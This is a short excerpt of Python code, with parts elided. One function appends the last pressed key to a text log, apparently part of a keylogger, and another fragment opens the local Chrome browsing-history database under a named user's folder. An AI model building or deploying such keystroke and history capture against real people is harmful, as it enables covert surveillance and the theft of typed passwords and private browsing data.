...
def write_file(var):
    with open("logs.txt", "a") as f:
        # Convert the last pressed key (the last item in the list) to a string and clean it
        new_var = str(var[-1]).replace("'", "")
        f.write(new_var)
        f.write(" ")
...
conn = sqlite3.connect('C:\\Users\\anubh\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History') #connect to the google chrome history database "add your path"
cursor = conn.cursor()
